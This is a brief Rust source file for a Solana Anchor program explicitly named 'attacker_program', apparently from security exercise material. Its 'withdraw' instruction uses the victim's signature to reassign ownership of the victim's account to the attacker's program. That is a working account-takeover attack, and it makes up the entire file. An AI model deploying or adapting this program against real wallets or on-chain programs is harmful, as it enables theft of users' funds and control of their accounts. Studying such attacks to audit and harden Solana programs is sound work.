use anchor_lang::prelude::*;
use anchor_lang::solana_program::{program::invoke, system_instruction};

declare_id!("EquV4CVyuUnoaWjAA8ZEQRNaRojnQJo3PoR3uPBBhau2");

#[program]
pub mod attacker_program {
    use super::*;

    pub fn withdraw(ctx: Context<Withdraw>) -> Result<()> {
        // Reassign victim account ownership to this program
        let ix = system_instruction::assign(
            ctx.accounts.victim.key,
            ctx.program_id,
        );

        invoke(
            &ix,
            &[ctx.accounts.victim.to_account_info()],
        )?;

        Ok(())
    }
}

#[derive(Accounts)]
pub struct Withdraw<'info> {
    #[account(mut)]
    pub victim: Signer<'info>,
    pub system_program: Program<'info, System>,
}

